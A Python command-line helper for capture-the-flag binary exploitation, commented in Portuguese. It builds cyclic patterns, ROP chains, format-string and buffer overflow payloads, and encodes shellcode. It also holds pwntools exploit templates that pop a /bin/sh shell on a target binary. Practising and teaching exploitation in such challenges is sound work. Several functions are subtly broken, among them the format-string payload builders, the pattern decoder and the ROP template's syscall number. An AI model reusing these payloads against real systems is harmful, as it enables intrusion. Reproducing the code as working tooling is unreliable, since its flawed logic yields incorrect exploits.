#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CTF Helper — Assistente para Competitive Hacking
Ferramentas para Buffer Overflow, ROP, Format Strings, etc.
"""

import sys
import json
import struct
import hashlib
import base64
import re
from typing import Dict, List, Optional, Tuple
from datetime import datetime


class CTFHelper:
    """Ferramentas para CTF e binary exploitation"""
    
    # Character sets para cyclic patterns
    CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
    
    def __init__(self):
        self.history: List[Dict] = []
    
    # ================================================================
    # CYCLIC PATTERN (Metasploit-compatible)
    # ================================================================
    
    def generate_pattern(self, length: int = 200) -> str:
        """Gera padrão cíclico para offset discovery"""
        chars = list(self.CHARSET)
        result = []
        i = 0
        while len(result) < length:
            a = chars[i % len(chars)]
            b = chars[(i // len(chars)) % len(chars)]
            c = chars[(i // len(chars) // len(chars)) % len(chars)]
            result.extend([a, b, c])
            i += 1
        return "".join(result[:length])
    
    def decode_pattern(self, pattern: str) -> int:
        """Encontra offset de um valor no padrão cíclico"""
        chars = list(self.CHARSET)
        n = len(pattern)
        for i in range(0, len(chars) ** 3):
            a = chars[i % len(chars)]
            b = chars[(i // len(chars)) % len(chars)]
            c = chars[(i // len(chars) // len(chars)) % len(chars)]
            window = a + b + c
            pos = pattern.find(window[:min(3, n)])
            if pos != -1:
                return pos + (3 if len(window) == 3 else 0)
        return -1
    
    # ================================================================
    # ROP CHAIN BUILDER
    # ================================================================
    
    def build_rop_chain_x86(self, target_func: str = 'system', args: List[int] = None) -> bytes:
        """Constrói ROP chain básica para x86"""
        args = args or []
        chain = bytearray()
        
        # Padding para alinhar stack
        chain.extend(b'\x41' * 64)  # 64 bytes de padding
        
        # Endereço de retorno (placeholder - usuário deve substituir)
        chain.extend(struct.pack('<I', 0xDEADBEEF))  # ret
        
        # Endereço da função alvo
        func_addrs = {
            'system': 0x08048090,
            'execve': 0x08048100,
            'exit': 0x08048200,
        }
        func_addr = func_addrs.get(target_func, 0x08048090)
        chain.extend(struct.pack('<I', func_addr))
        
        # Argumentos
        for arg in args:
            chain.extend(struct.pack('<I', arg))
        
        return bytes(chain)
    
    def build_rop_chain_x64(self, target_func: str = 'system', args: List[int] = None) -> bytes:
        """Constrói ROP chain básica para x64 (System V ABI)"""
        args = args or []
        chain = bytearray()
        
        # Padding
        chain.extend(b'\x41' * 72)  # 72 bytes (8 * 9 para alignment)
        
        # Gadgets placeholders (usuário deve substituir)
        chain.extend(struct.pack('<Q', 0x401000))  # ret
        chain.extend(struct.pack('<Q', 0x401001))  # pop rdi; ret
        chain.extend(struct.pack('<Q', 0x401002))  # pop rsi; ret
        chain.extend(struct.pack('<Q', 0x401003))  # pop rdx; ret
        chain.extend(struct.pack('<Q', 0x401004))  # pop rax; ret
        
        # Syscall
        chain.extend(struct.pack('<Q', 0x401005))  # syscall; ret
        
        return bytes(chain)
    
    # ================================================================
    # FORMAT STRING
    # ================================================================
    
    def format_string_offset(self, target_addr: int, value: int) -> str:
        """Gera payload de format string para escrever valor em endereço"""
        # Payload para escrever value em target_addr
        payload = f"{target_addr & 0xFFFF:x}{((target_addr >> 16) & 0xFFFF):x}%{value:x}n%{value:x}n"
        return payload
    
    def format_string_read(self, addr: int, num_bytes: int = 4) -> str:
        """Gera payload para ler memória no endereço"""
        # Usar %x para ler words
        fmt = "%." + str(num_bytes * 2) + "x" * num_bytes
        return fmt % addr
    
    # ================================================================
    # SHELLCODE HELPERS
    # ================================================================
    
    def encode_shellcode(self, shellcode: bytes, encoding: str = 'c') -> str:
        """Codifica shellcode em diferentes formatos"""
        if encoding == 'c':
            return ', '.join(f'0x{b:02x}' for b in shellcode)
        elif encoding == 'python':
            return ''.join(f'\\x{b:02x}' for b in shellcode)
        elif encoding == 'hex':
            return shellcode.hex()
        elif encoding == 'base64':
            return base64.b64encode(shellcode).decode()
        elif encoding == 'js':
            return ''.join(f'\\x{b:02x}' for b in shellcode)
        elif encoding == 'ruby':
            return ''.join(f'\\x{b:02x}' for b in shellcode)
        else:
            return shellcode.hex()
    
    def decode_shellcode(self, encoded: str, encoding: str = 'hex') -> bytes:
        """Decodifica shellcode de diferentes formatos"""
        if encoding == 'hex':
            return bytes.fromhex(encoded)
        elif encoding in ('c', 'python', 'js', 'ruby'):
            # Remover escapes e converter
            clean = encoded.replace('\\x', '').replace(',', '').replace(' ', '')
            return bytes.fromhex(clean)
        elif encoding == 'base64':
            return base64.b64decode(encoded)
        else:
            return bytes.fromhex(encoded)
    
    # ================================================================
    # BUFFER OVERFLOW HELPERS
    # ================================================================
    
    def calculate_offset(self, pattern: str, search_for: str) -> int:
        """Calcula offset usando padrão cíclico"""
        pos = pattern.find(search_for)
        if pos == -1:
            # Tentar como little-endian
            search_le = search_for[::-1]
            pos = pattern.find(search_le)
            if pos != -1:
                return pos + 3
        return pos
    
    def generate_bof_payload(self, padding: int, ret_address: bytes, 
                             shellcode: bytes = None, nop_sled: int = 100) -> bytes:
        """Gera payload básico de buffer overflow"""
        payload = b'A' * padding  # Padding até o EIP
        
        # NOP sled
        if nop_sled > 0:
            payload += b'\x90' * nop_sled
        
        # Shellcode
        if shellcode:
            payload += shellcode
        
        # Return address (overwrite EIP)
        payload += ret_address
        
        # Post-shell (retn addresses)
        payload += b'B' * 100
        
        return payload
    
    # ================================================================
    # UTILITY FUNCTIONS
    # ================================================================
    
    def byte_swap(self, value: int, size: int = 4) -> int:
        """Faz byte swap de um valor"""
        return int.from_bytes(value.to_bytes(size, 'little')[::-1], 'little')
    
    def pack_value(self, value: int, fmt: str = '<I') -> bytes:
        """Embalilha valor com format especificado"""
        return struct.pack(fmt, value)
    
    def unpack_value(self, data: bytes, fmt: str = '<I') -> int:
        """Desembala valor"""
        return struct.unpack(fmt, data)[0]
    
    def calculate_leak(self, leaked: str, base: int, offset: int) -> int:
        """Calcula endereço base a partir de leak"""
        try:
            leaked_int = int(leaked, 16)
            return leaked_int - offset
        except:
            return None
    
    # ================================================================
    # EXPLOIT TEMPLATES
    # ================================================================
    
    EXPLOIT_TEMPLATES = {
        'buffer_overflow_basic': '''
#!/usr/bin/env python3
# CTF Buffer Overflow Template

from pwn import *

# Configuração
elf = ELF('./binary')
p = process('./binary')
# p = remote('target.com', port)

# Payload
padding = 100  # Ajustar conforme análise
ret_address = p64(0xdeadbeef)  # Ajustar endereço
shellcode = asm(shellcraft.sh())  # Ou shellcode customizado

payload = flat({
    padding: b'A',
    'ret': ret_address,
})

# Enviar payload
p.sendline(payload)
p.interactive()
''',
        'rop_chain': '''
#!/usr/bin/env python3
# CTF ROP Chain Template

from pwn import *

context.arch = 'amd64'
elf = ELF('./binary')
p = process('./binary')

# Gadgets
pop_rdi = 0x40119b  # pop rdi; ret
pop_rsi = 0x401199  # pop rsi; ret
pop_rax = 0x40119a  # pop rax; ret
syscall = 0x401050  # syscall; ret

# /bin/sh string
binsh = next(elf.search(b'/bin/sh'))

# ROP Chain
payload = b'A' * 100  # padding
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0)  # execve = 59, mas precisamos de 0 para string null
payload += p64(syscall)

p.sendline(payload)
p.interactive()
''',
        'format_string': '''
#!/usr/bin/env python3
# CTF Format String Template

from pwn import *

elf = ELF('./binary')
p = process('./binary')

# Endereços
target_addr = 0x0804A000  # Onde escrever
leak_addr = 0x0804B000   # Onde vazar

# primeiro, vazar um endereço para calcular base
p.recvuntil(b'Input:> ')
payload = flat({
    0: leak_addr,
    4: leak_addr + 2,
    8: '%6$s',  # offset do argumento na stack
})
p.sendline(payload)
leaked = p.recvline()
print(f'Leaked: {leaked}')

# Depois, escrever no endereço alvo
# ... (implementação específica do desafio)

p.interactive()
''',
    }
    
    def get_template(self, template_name: str) -> str:
        """Retorna template de exploit"""
        return self.EXPLOIT_TEMPLATES.get(template_name, '[ERROR] Template not found')
    
    def list_templates(self) -> List[str]:
        """Lista templates disponíveis"""
        return list(self.EXPLOIT_TEMPLATES.keys())
    
    # ================================================================
    # MAIN INTERFACE
    # ================================================================
    
    def run(self, command: str, args: List[str] = None) -> Dict:
        """Executa comando do helper"""
        args = args or []
        result = {
            'command': command,
            'timestamp': datetime.now().isoformat(),
            'result': None,
        }
        
        if command == 'pattern_create':
            length = int(args[0]) if args else 200
            result['result'] = self.generate_pattern(length)
            
        elif command == 'pattern_offset':
            if len(args) >= 1:
                search_value = args[0]
                pattern = self.generate_pattern(1000)
                offset = self.calculate_offset(pattern, search_value)
                result['result'] = {'offset': offset, 'pattern_length': len(pattern), 'search': search_value}
            else:
                result['error'] = 'Usage: pattern_offset <search_value>'
                
        elif command == 'rop_x86':
            result['result'] = self.build_rop_chain_x86(*args)
            
        elif command == 'rop_x64':
            result['result'] = self.build_rop_chain_x64(*args)
            
        elif command == 'encode':
            if len(args) >= 2:
                result['result'] = self.encode_shellcode(args[0].encode(), args[1])
            else:
                result['error'] = 'Usage: encode <shellcode> <format>'
                
        elif command == 'decode':
            if len(args) >= 2:
                result['result'] = self.decode_shellcode(args[0], args[1])
            else:
                result['error'] = 'Usage: decode <encoded> <format>'
                
        elif command == 'template':
            result['result'] = self.get_template(args[0] if args else '')
            
        elif command == 'templates':
            result['result'] = self.list_templates()
            
        else:
            result['error'] = f'Unknown command: {command}'
            
        self.history.append(result)
        return result


def main():
    import argparse
    parser = argparse.ArgumentParser(description='CTF Helper — Binary Exploitation Tools')
    parser.add_argument('command', choices=[
        'pattern_create', 'pattern_offset', 'rop_x86', 'rop_x64',
        'encode', 'decode', 'template', 'templates'
    ], help='Comando a executar')
    parser.add_argument('args', nargs='*', help='Argumentos')
    parser.add_argument('--output', '-o', help='Arquivo de saída')
    
    args = parser.parse_args()
    
    helper = CTFHelper()
    result = helper.run(args.command, args.args)
    
    if 'result' in result:
        output = result['result']
        if isinstance(output, (bytes, bytearray)):
            print(output.hex())
            if args.output:
                with open(args.output, 'wb') as f:
                    f.write(output)
        elif isinstance(output, str) and output.startswith('{'):
            print(output)
        else:
            print(json.dumps(output, indent=2, default=str) if isinstance(output, dict) else str(output))
    elif 'error' in result:
        print(f"[ERROR] {result['error']}")
        sys.exit(1)


if __name__ == "__main__":
    main()
